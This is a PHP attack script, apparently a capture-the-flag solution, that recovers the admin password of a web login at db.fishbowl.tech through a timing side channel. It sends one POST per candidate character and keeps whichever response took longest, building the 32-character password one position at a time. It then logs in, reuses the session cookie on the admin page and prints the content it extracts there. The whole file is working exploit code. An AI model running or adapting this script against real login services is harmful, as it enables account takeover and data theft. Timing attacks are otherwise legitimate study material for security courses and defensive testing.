<?php

$url_login = "https://db.fishbowl.tech/login";
$url_admin = "https://db.fishbowl.tech/admin";
$PASSWORD_LENGTH = 32;
$guessed_password = "";

function request($url, $method="GET", $username="", $password="",  $follow=true, $cookie="")
{
	$data = array(
		'username' => $username,
		'password' => $password,
		 );
	$data = http_build_query($data);

	$header = "";

	if($method === "POST")
		$header .= "Content-type: 	application/x-www-form-urlencoded\r\n"
		."Content-Length: ".strlen($data)."\r\n";
	if(!empty($cookie))
		 $header .= "Cookie: ".$cookie."\r\n";

	$options = array(
		'http' => array(
			'header'  => $header,
			'method'  => $method,
			'content' => $data,
			'follow_location' => $follow));
	
	$context  = stream_context_create($options);
	$result = file_get_contents($url, false, $context);

	if ($result === FALSE) { print("Something went wrong...\n"); exit(-1); };

	$obt_cookie = str_replace("Set-Cookie: ", "", $http_response_header[7]);

	return array("result" => $result, "cookie" => $obt_cookie);
}


for($n = strlen($guessed_password) + 1; $n <= $PASSWORD_LENGTH; $n++) {

	$max_t = 0;
	$max_idx = 0;

	for($i = 32; $i < 128; $i++) {
		$passwd = str_repeat(" ", strlen($guessed_password))
				  .chr($i)
				  .str_repeat(" ", $PASSWORD_LENGTH - strlen($guessed_password) - 1);

		$start = microtime(true);
		request($url_login, "POST", "admin", $passwd);
		$time_elapsed_secs = microtime(true) - $start;

		if($time_elapsed_secs > $max_t){
			$max_t = $time_elapsed_secs;
			$max_idx = $i;
		}
	}

	$guessed_password .= chr($max_idx);
	print("[*] ".$guessed_password."\n");
}

print("[+] Password: ".$guessed_password."\n");

$cookie = request($url_login, "POST", "admin", $guessed_password, false)['cookie'];
$result = request($url_admin, "GET", "", "", false, $cookie)['result'];

preg_match("'<pre>(.*?)</pre>'si", $result, $match);

if($match) { print($match[1]); }

?>
